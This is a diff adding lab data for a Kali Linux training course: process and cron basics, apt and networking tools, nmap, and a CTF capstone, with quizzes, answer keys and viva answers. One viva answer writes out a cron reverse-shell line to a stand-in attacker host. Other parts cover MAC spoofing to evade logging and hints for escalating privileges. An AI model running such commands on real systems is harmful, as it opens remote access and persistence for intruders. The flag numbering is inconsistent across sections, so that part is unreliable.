+                    "content": "systemctl manages systemd services:\n• systemctl status [service] — Check service status\n• systemctl start [service] — Start a service\n• systemctl stop [service] — Stop a service\n• systemctl restart [service] — Restart a service\n• systemctl enable [service] — Enable at boot\n• systemctl disable [service] — Disable at boot\n• systemctl list-units --type=service — List all services\n\nExamples in security:\n• systemctl status ssh — Check SSH daemon\n• systemctl start apache2 — Start web server\n• systemctl stop postgresql — Stop database"
+                },
+                {
+                    "title": "Text Editors (nano & vi)",
+                    "content": "nano — Beginner-friendly editor:\n• nano file.txt — Open file\n• Ctrl+O → Enter — Save file\n• Ctrl+X — Exit nano\n• Ctrl+W — Search in file\n• Ctrl+K — Cut line, Ctrl+U — Paste\n\nvi/vim — Advanced modal editor:\n• vi file.txt — Open file\n• Press 'i' — Insert mode (typing)\n• Press Esc — Command mode\n• :w — Write/save\n• :q! — Quit without saving\n• :wq — Save and quit\n• dd — Delete current line\n• /[pattern] — Search"
+                },
+                {
+                    "title": "Background Processes & Cron Jobs",
+                    "content": "• [command] & — Run in background\n• jobs — List background jobs\n• fg [n] — Bring job n to foreground\n• bg [n] — Send job n to background\n• nohup [command] & — Run immune to hangup\n• Ctrl+Z — Suspend current process\n\nCron Jobs (scheduled tasks):\n• crontab -l — List current user's cron jobs\n• crontab -e — Edit cron jobs\n• cat /etc/crontab — System-wide cron jobs\n• ls /etc/cron.d/ — Additional cron config files\nFormat: minute hour day month weekday command"
+                }
+            ]
+        },
+        "procedure": [
+            "Open the Kali Linux VM terminal.",
+            "Run 'ps aux' to list all running processes.",
+            "Identify the suspicious unauthorized miner process (PID 1337).",
+            "Run 'kill -9 1337' to terminate the malicious process.",
+            "Verify with 'ps aux | grep miner'.",
+            "Run 'systemctl status ssh' to check SSH service status.",
+            "Practice editing: create a new file with 'nano /tmp/notes.txt', type something, save with Ctrl+O, exit with Ctrl+X.",
+            "View cron jobs with 'crontab -l'."
+        ],
+        "pretest": [
+            { "q": "ps aux shows:", "options": ["Active SSH connections", "All running processes with CPU/MEM stats", "Available packages", "Audit security logs"], "answer": "All running processes with CPU/MEM stats" },
+            { "q": "kill -9 [PID] sends signal:", "options": ["SIGTERM", "SIGSTOP", "SIGKILL", "SIGHUP"], "answer": "SIGKILL" },
+            { "q": "To save and exit in nano:", "options": ["Ctrl+X then Enter", "Ctrl+O then Enter, then Ctrl+X", ":wq", "Alt+S"], "answer": "Ctrl+O then Enter, then Ctrl+X" },
+            { "q": "systemctl enable [service] does what?", "options": ["Starts service now", "Enables service to start at boot", "Enables security features", "Extends service timeout"], "answer": "Enables service to start at boot" },
+            { "q": "crontab -l does what?", "options": ["Lists log files", "Lists current user's cron jobs", "Lists active connections", "Lists loaded services"], "answer": "Lists current user's cron jobs" }
+        ],
+        "posttest": [
+            { "q": "Which PID in ps aux was the suspicious unauthorized miner?", "options": ["102", "450", "1337", "2048"], "answer": "1337" },
+            { "q": "What command force-kills process with PID 1337?", "options": ["kill 1337", "kill -15 1337", "kill -9 1337", "stop 1337"], "answer": "kill -9 1337" },
+            { "q": "How do you exit vi/vim without saving?", "options": [":q", ":wq", "Ctrl+X", ":q!"], "answer": ":q!" },
+            { "q": "nohup [command] & is used to:", "options": ["Run command with root", "Run command immune to hangup in background", "Run command with no output", "Run command in a new terminal"], "answer": "Run command immune to hangup in background" },
+            { "q": "Which cron field format is: minute hour day month weekday command?", "options": ["* * * * * command", "command * * * * *", "All of above", "None of above"], "answer": "* * * * * command" }
+        ],
+        "viva": [
+            { "q": "1. What is the difference between SIGTERM and SIGKILL?", "a": "SIGTERM (signal 15): Politely asks the process to terminate. The process can intercept this signal, clean up resources, and exit gracefully. SIGKILL (signal 9): Immediately and forcefully terminates the process. Cannot be caught or ignored by the process. Use SIGTERM first; resort to SIGKILL for unresponsive processes." },
+            { "q": "2. How do attackers use cron jobs for persistence?", "a": "Attackers add malicious cron jobs after gaining access: (1) crontab -e to add reverse shell: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'. (2) /etc/crontab or /etc/cron.d/ for system-level persistence. (3) Writing to /etc/cron.hourly/, /etc/cron.daily/. This ensures the malicious process restarts even after rebooting. Defense: regularly audit crontabs." }
+        ],
+        "practice_commands": ["ps aux", "kill -9 1337", "ps aux | grep miner", "systemctl status ssh", "crontab -l", "top", "jobs", "pgrep bash"],
+        "practice_questions": ["Task 1: Run ps aux and identify any process with >90% CPU usage. What is it?", "Task 2: Kill the suspicious miner process. Verify it's gone.", "Task 3: Check the status of the ssh service using systemctl.", "Task 4: Create a file using nano and save it."],
+        "assignment": "You are responding to a cryptominer incident on a Kali server. Perform these investigation and remediation steps: (1) Run ps aux and identify the process consuming >90% CPU. Record its PID, command, and CPU%. (2) Terminate it with kill -9 [PID]. Verify it's gone by running ps aux | grep miner. (3) Check the SSH service: systemctl status ssh — is it active? Record the output. (4) Run crontab -l to check for any suspicious scheduled jobs. (5) Create an incident log: nano /tmp/incident_report.txt, write a 3-line summary of what you found, save it (Ctrl+O, Enter, Ctrl+X), then cat it to verify. Submit your incident report and all command outputs below."
+};
+window.VLAB_DATA["kali_exp6"] = {
+        "title": "THM 6: Linux Fundamentals Part 3 — Package Management & Networking Utilities",
+        "aim": "To understand Linux package management with apt, install and remove tools, and use essential networking utilities including ifconfig, ip a, ping, netstat, and nmap for reconnaissance.",
+        "prerequisites": ["Completion of THM Labs 1–5", "Understanding of Linux processes and services", "Basic familiarity with networking concepts (IP address, port)"],
+        "outcomes": ["Update the system and install packages with apt update / apt install", "Find your IP address using ip a and ifconfig", "Inspect the routing table with ip r", "Discover open ports on a host using nmap", "Monitor active network connections with netstat -tuln"],
+        "tools": [
+            { "name": "apt", "category": "Package Manager", "description": "Advanced Package Tool for Debian-based systems. apt update refreshes repo lists. apt install nmap installs the port scanner. apt remove uninstalls." },
+            { "name": "ip a / ifconfig", "category": "Network Interface Inspector", "description": "ip a shows all network interfaces and IP addresses. ifconfig is the older equivalent. Both reveal your Kali VM's IP address." },
+            { "name": "ping", "category": "Connectivity Test", "description": "Tests reachability of a host. ping -c 4 8.8.8.8 sends 4 ICMP packets to Google DNS and reports latency and packet loss." },
+            { "name": "nmap", "category": "Port Scanner", "description": "Network Mapper — scans for open ports and running services. nmap -sV 192.168.1.1 detects service versions. Core tool for reconnaissance." },
+            { "name": "netstat -tuln", "category": "Connection Monitor", "description": "Shows all active TCP/UDP listeners on the system. Reveals which services are running and on which ports. Essential for post-compromise analysis." }
+        ],
+        "theory": {
+            "intro": "TryHackMe Linux Fundamentals Part 3 focuses on package management and networking — the bridge between Linux fundamentals and active cybersecurity work. Being able to install penetration testing tools, inspect network interfaces, discover open ports, and monitor active connections are core skills for every security professional.",
+            "cards": [
+                {
+                    "title": "Package Management (apt)",
+                    "content": "apt (Advanced Package Tool) manages software on Debian/Kali:\n• apt update — Refresh package repository cache\n• apt upgrade — Upgrade all installed packages\n• apt install [pkg] — Install a package\n• apt remove [pkg] — Remove a package\n• apt search [keyword] — Search for packages\n• apt show [pkg] — Show package information\n• dpkg -l — List all installed packages\n• dpkg -i [pkg.deb] — Install local .deb file\n\nKali-specific:\n• apt install nmap — Install nmap scanner\n• apt install metasploit-framework — Install Metasploit\n• apt install burpsuite — Install Burp Suite"
+                },
+                {
+                    "title": "Network Interface Commands",
+                    "content": "• ifconfig — Show network interface configuration (legacy)\n• ip a / ip addr — Modern interface list (IP addresses)\n• ip r / ip route — Show routing table\n• ip link — Show interface link state\n• ifconfig eth0 down — Disable interface\n• ifconfig eth0 up — Enable interface\n• iwconfig — Wireless interface configuration\n• macchanger -r eth0 — Randomize MAC address\n• ip neigh — Show ARP cache (neighbor table)"
+                },
+                {
+                    "title": "Network Testing & Discovery",
+                    "content": "• ping [host] — ICMP echo test (check if host is alive)\n• ping -c 4 192.168.1.1 — Ping exactly 4 times\n• traceroute [host] — Trace packet path to host\n• nslookup [domain] — DNS resolution lookup\n• dig [domain] — Detailed DNS query\n• whois [domain] — Domain registration info\n• curl [url] — Fetch web page content\n• wget [url] — Download file from URL\n• nc -nvlp 4444 — Netcat listen on port 4444\n• nc [ip] [port] — Connect to host:port"
+                },
+                {
+                    "title": "Port Scanning with nmap",
+                    "content": "nmap (Network Mapper) is the essential port scanner:\n• nmap [host] — Basic TCP scan (top 1000 ports)\n• nmap -sV [host] — Service/version detection\n• nmap -sS [host] — SYN stealth scan (requires root)\n• nmap -O [host] — OS fingerprinting\n• nmap -p 80,443 [host] — Scan specific ports\n• nmap -p- [host] — Scan ALL 65535 ports\n• nmap -A [host] — Aggressive (OS+version+scripts)\n• nmap 192.168.1.0/24 — Scan entire subnet\n• nmap --script vuln [host] — Run vulnerability scripts"
+                }
+            ]
+        },
+        "procedure": [
+            "Open the Kali Linux VM terminal.",
+            "Run 'ip a' to inspect network interfaces and find your IP address.",
+            "Run 'ping -c 4 8.8.8.8' to test internet connectivity (simulated).",
+            "Run 'ip r' to view the routing table.",
+            "Simulate 'apt update' (command is recognized by the VM).",
+            "Simulate 'apt install nmap' to install the network scanner.",
+            "Run 'nmap -sV 192.168.1.1' to perform a service version scan (simulated).",
+            "Run 'netstat -tuln' to view listening ports."
+        ],
+        "pretest": [
+            { "q": "apt update does what?", "options": ["Updates all packages", "Refreshes the package repository cache", "Upgrades the OS version", "Updates system time"], "answer": "Refreshes the package repository cache" },
+            { "q": "ifconfig shows:", "options": ["Running processes", "Network interface IP and MAC addresses", "File system info", "CPU information"], "answer": "Network interface IP and MAC addresses" },
+            { "q": "nmap -sV performs:", "options": ["SYN stealth scan", "Service and version detection", "OS fingerprinting", "Vulnerability scanning"], "answer": "Service and version detection" },
+            { "q": "ping 8.8.8.8 uses which protocol?", "options": ["TCP", "UDP", "ICMP", "ARP"], "answer": "ICMP" },
+            { "q": "netstat -tuln shows:", "options": ["Network routes", "Listening TCP and UDP ports", "NTP time servers", "Traffic statistics"], "answer": "Listening TCP and UDP ports" }
+        ],
+        "posttest": [
+            { "q": "Which command shows all IP addresses on all interfaces (modern)?", "options": ["ifconfig -a", "ip a", "arp -a", "netstat -i"], "answer": "ip a" },
+            { "q": "To scan ALL 65535 ports with nmap:", "options": ["nmap -p 65535", "nmap -p-", "nmap -full", "nmap -a"], "answer": "nmap -p-" },
+            { "q": "apt install nmap would install which tool?", "options": ["A network firewall", "A network port scanner", "A password manager", "A web server"], "answer": "A network port scanner" },
+            { "q": "traceroute shows:", "options": ["Open ports on a host", "The path (routers) packets take to reach a destination", "File transfer progress", "DNS records"], "answer": "The path (routers) packets take to reach a destination" },
+            { "q": "Which nmap flag enables OS fingerprinting?", "options": ["-sV", "-p-", "-O", "-A"], "answer": "-O" }
+        ],
+        "viva": [
+            { "q": "1. What is the difference between nmap -sS and nmap -sT?", "a": "nmap -sS (SYN/Stealth scan): Sends SYN packet, waits for SYN-ACK (open) or RST (closed), then sends RST instead of completing the 3-way handshake. Never completes connection — stealthier, harder to detect in logs. Requires root. nmap -sT (TCP Connect scan): Completes the full 3-way handshake (SYN → SYN-ACK → ACK). Slower, noisier, detectable. Works without root." },
+            { "q": "2. What is macchanger and why do attackers use it?", "a": "macchanger changes the MAC (Media Access Control) address of a network interface. Attackers use it to: (1) Bypass MAC address filtering on access points. (2) Avoid identification in access logs. (3) Evade network monitoring that tracks devices by MAC. Command: macchanger -r eth0 assigns a random MAC. The original MAC is stored in NIC firmware; changes are not permanent across reboots." }
+        ],
+        "practice_commands": ["ip a", "ip r", "ping -c 4 8.8.8.8", "apt update", "apt install nmap", "nmap -sV 192.168.1.1", "netstat -tuln", "ifconfig"],
+        "practice_questions": ["Task 1: Find your Kali VM's IP address using ip a.", "Task 2: What is the default gateway (router) IP in ip r?", "Task 3: Run nmap on the local host and find open ports.", "Task 4: What services are listening on the VM? Use netstat -tuln."],
+        "assignment": "Perform a full network reconnaissance and configuration audit on the Kali VM: (1) Run ip a — record the IP address, subnet mask, and interface name (e.g., eth0). (2) Run ip r — identify and record the default gateway IP. (3) Run ping -c 4 8.8.8.8 — record packet loss % and average latency. (4) Run netstat -tuln — list all ports that are in LISTEN state with their service names. (5) Run nmap -sV 127.0.0.1 — scan localhost and record all open ports and service versions detected. Compile a network audit report with all findings and submit it below."
+};
+window.VLAB_DATA["kali_exp7"] = {
+        "title": "THM 7: TryHackMe CTF Challenge Room — Ultimate Linux Command Challenge",
+        "aim": "To apply all TryHackMe Linux Fundamentals skills in a Capture The Flag (CTF) challenge room, finding hidden flags across the virtual file system using navigation, grep, find, permissions, and process management.",
+        "prerequisites": ["Completion of THM Labs 1–6", "Proficiency in navigation, grep, find, chmod, sudo, ps aux, and nmap", "Understanding of CTF methodology and flag format THM{...}"],
+        "outcomes": ["Apply all Linux Fundamentals skills in a combined CTF challenge", "Find 5 hidden THM flags across the virtual file system", "Escalate privileges using sudo to access /root directory", "Identify and terminate malicious processes from ps aux output", "Demonstrate SOC analyst skills: log analysis, file forensics, process investigation"],
+        "tools": [
+            { "name": "CTF Methodology", "category": "Challenge Framework", "description": "Enumerate → Search → Escalate → Analyse. Use ls, find, grep, sudo, ps aux, and netstat systematically to uncover all 5 flags." },
+            { "name": "grep -r 'THM' /home", "category": "Flag Hunter", "description": "Recursively searches all files under /home for THM{...} flag strings. The fastest way to find flags in user home directories." },
+            { "name": "sudo cat /root/root_flag.txt", "category": "Privilege Escalation", "description": "Uses sudo to read the root-only flag file. Requires kali user to have sudo privilege — verify first with sudo -l." },
+            { "name": "ps aux | sort -k3 -rn", "category": "Threat Detection", "description": "Lists processes sorted by CPU usage descending. Reveals unauthorized miners or backdoors consuming abnormal resources." },
+            { "name": "cat /var/log/auth.log | grep THM", "category": "Log Forensics", "description": "Searches the authentication log for embedded flag strings — simulates real log analysis during an incident response investigation." }
+        ],
+        "theory": {
+            "intro": "This is the capstone CTF challenge lab combining all skills from TryHackMe Linux Fundamentals Parts 1, 2, and 3. You must use file navigation, grep searching, privilege escalation with sudo, process analysis, and network reconnaissance to find 5 hidden flags scattered across the Kali Linux virtual machine. This mirrors real TryHackMe room challenges.",
+            "cards": [
+                {
+                    "title": "CTF Challenge Overview",
+                    "content": "A Capture The Flag (CTF) is a cybersecurity competition where you find hidden strings called 'flags' (usually formatted as FLAG{...} or THM{...}) by exploiting vulnerabilities, solving puzzles, or demonstrating Linux skills.\n\nIn this lab:\n• Flag 1: File system navigation challenge\n• Flag 2: grep search in log files challenge\n• Flag 3: SUID/sudo privilege escalation\n• Flag 4: Hidden file discovery challenge\n• Flag 5: Process analysis challenge"
+                },
+                {
+                    "title": "CTF Methodology",
+                    "content": "Approach CTF challenges systematically:\n1. Enumeration — ls -la, find, ps aux, netstat\n2. Read all text files — cat *.txt, cat /etc/passwd\n3. Search for keywords — grep -r 'THM' /home\n4. Check permissions — ls -la, find / -perm /4000\n5. Escalate privileges — sudo -l, sudo su, SUID exploits\n6. Check logs — /var/log/auth.log, /var/log/syslog\n7. Inspect processes — ps aux, top, /proc directory\n8. Network recon — netstat -tuln, ip a, arp -a"
+                },
+                {
+                    "title": "Flag Locations (Hints)",
+                    "content": "Hint 1: First flag is in your home directory — basic cat command.\nHint 2: Second flag is inside a log file in /var/log — use grep.\nHint 3: Third flag is in /root — requires sudo privilege escalation.\nHint 4: Fourth flag is hidden inside /etc/passwd as a comment — use grep.\nHint 5: Fifth flag is in the downloads/access.log — use grep with pipes.\n\nBonus: Try to find the hidden flag inside /home/kali/downloads/access.log by piping cat through grep for the THM pattern."
+                },
+                {
+                    "title": "Command Reference Cheatsheet",
+                    "content": "Navigation: pwd, ls -la, cd, tree\nFiles: cat, head, tail, less, file, stat, wc\nSearch: find, grep, locate, which, whereis\nPermissions: chmod, chown, ls -la, stat\nPrivilege: sudo, su, sudo -l, id\nProcesses: ps aux, top, kill -9, pgrep\nNetwork: ip a, netstat, nmap, ping\nEditors: nano (Ctrl+O save, Ctrl+X exit), vi (:wq save)\nPackages: apt update, apt install\nShell: echo, history, alias, export, env"
+                }
+            ]
+        },
+        "procedure": [
+            "Open the Kali Linux VM terminal.",
+            "Start enumeration: 'ls -la /home/kali' — find Flag 1.",
+            "Grep through access.log: 'cat /home/kali/downloads/access.log | grep THM' — find Flag 5.",
+            "Use sudo: 'sudo cat /root/root_flag.txt' — find Flag 3.",
+            "Search /etc/passwd: 'grep THM /etc/passwd' — find Flag 4.",
+            "Read access.log: 'cat /home/kali/downloads/access.log | grep flag' — find Flag 2.",
+            "Investigate processes: 'ps aux | grep -v grep' — identify the suspicious miner (Flag bonus).",
+            "Submit all 5 flags in the Task panel on the left."
+        ],
+        "pretest": [
+            { "q": "In a CTF, a 'flag' is:", "options": ["A Linux terminal command", "A hidden string used to prove you completed a challenge", "A network packet type", "A type of file permission"], "answer": "A hidden string used to prove you completed a challenge" },
+            { "q": "First step in any Linux CTF challenge is:", "options": ["Run nmap immediately", "Enumeration — listing files, processes, users", "Install tools", "Check internet connectivity"], "answer": "Enumeration — listing files, processes, users" },
+            { "q": "grep -r 'THM' /home searches for:", "options": ["Files named THM", "THM string in all files under /home recursively", "THM user accounts", "THM network connections"], "answer": "THM string in all files under /home recursively" },
+            { "q": "find / -perm /4000 is used to find:", "options": ["World-writable files", "SUID binaries (privilege escalation targets)", "Files owned by root", "Files created today"], "answer": "SUID binaries (privilege escalation targets)" },
+            { "q": "To check which sudo commands you can run:", "options": ["sudo -l", "sudo list", "cat /etc/sudoers", "su -check"], "answer": "sudo -l" }
+        ],
+        "posttest": [
+            { "q": "Which command found Flag 1 in the home directory?", "options": ["ls", "cat /home/kali/flag1.txt", "find / -name flag1.txt", "grep THM /home"], "answer": "cat /home/kali/flag1.txt" },
+            { "q": "Flag 4 was hidden in /etc/passwd as a:", "options": ["Username", "Password hash", "Comment line with THM{grep_search_wizard}", "Group entry"], "answer": "Comment line with THM{grep_search_wizard}" },
+            { "q": "Flag 3 required what to access?", "options": ["Regular user privileges", "grep command", "sudo privilege escalation to read /root", "Network access"], "answer": "sudo privilege escalation to read /root" },
+            { "q": "The suspicious process consuming 98.4% CPU was:", "options": ["systemd", "-bash", "./unauthorized_miner", "sshd"], "answer": "./unauthorized_miner" },
+            { "q": "How many flags were hidden in this CTF challenge?", "options": ["3", "4", "5", "7"], "answer": "5" }
+        ],
+        "viva": [
+            { "q": "1. Explain the CTF methodology you used in this challenge.", "a": "Approach: (1) Enumerate: ls -la home, find / -name '*.txt', ps aux. (2) Search: grep -r 'THM' /home for flags. (3) Escalate: sudo -l to check privileges, sudo cat /root/root_flag.txt. (4) Log analysis: cat /var/log/auth.log | grep THM. (5) Process analysis: ps aux | grep -v grep to find malicious processes. Systematic enumeration is the foundation of every CTF." },
+            { "q": "2. What real-world incident response skills did this CTF practice?", "a": "This CTF mirrors real incident response tasks: (1) Log analysis (auth.log, access.log) to find intrusion evidence. (2) Process investigation (ps aux) to identify malware like cryptominers. (3) File system forensics to locate dropped malicious files. (4) Privilege escalation auditing (sudo -l, SUID scan). (5) Network state analysis (netstat). These are the core skills of Security Operations Center (SOC) analysts and Digital Forensics and Incident Response (DFIR) specialists." }
+        ],
+        "practice_commands": ["ls -la /home/kali", "cat /home/kali/flag1.txt", "grep THM /etc/passwd", "sudo cat /root/root_flag.txt", "cat /home/kali/downloads/access.log | grep THM", "ps aux | sort -k3 -rn | head -5", "find / -name '*.txt' 2>/dev/null", "grep -r 'THM' /home/kali"],
+        "practice_questions": ["Task 1: Find and submit Flag 1 from your home directory.", "Task 2: Find the grep flag hidden in /etc/passwd.", "Task 3: Use sudo to read the root flag.", "Task 4: Identify and name the suspicious CPU-intensive process.", "Task 5: Find Flag 5 in the access.log using grep and pipes."],
+        "assignment": "FINAL CTF CHALLENGE — Prove your Linux mastery by finding all 5 hidden THM flags on this Kali VM. Document your exact methodology for each flag: (1) Flag 1: Navigate to /home/kali and read flag1.txt — record the full flag. (2) Flag 2: Search /etc/passwd with grep for a THM pattern — record the flag and the full grep command you used. (3) Flag 3: Use sudo cat /root/root_flag.txt — record the flag and explain why you needed sudo. (4) Flag 4: Run find / -name '*.txt' 2>/dev/null to find hidden files — locate and read the hidden flag file. (5) Flag 5: Pipe /home/kali/downloads/access.log through grep — find and record the flag. For each flag, write: the command, the full output, and the THM{...} flag value. Compile your CTF writeup report and submit below."
+};
